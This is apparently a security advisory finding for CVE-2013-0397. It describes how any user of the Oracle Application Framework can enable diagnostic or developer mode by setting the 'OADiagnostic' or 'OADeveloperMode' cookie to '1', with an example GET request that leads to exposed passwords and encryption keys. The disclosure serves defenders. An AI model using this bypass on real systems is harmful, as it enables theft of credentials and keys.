Finding 1: Oracle Application Framework Diagnostic Mode Bypass
Vulnerability
CVE: CVE-2013-0397

The Oracle Application Framework supports a diagnostic and developer mode
feature that are intended to be enabled from developer or administrative
interfaces. However, any user can manually enable the modes by setting the
"OADiagnostic" or "OADeveloperMode" cookies to "1".

Example:
GET request for enabling diagnostic mode

GET /OA_HTML/RF.jsp?function_id=1038712&resp_id=23350&resp_appl_id=80

"About this page" section allows access to a number of sensitive settings,
including passwords and encryption/decryption keys.
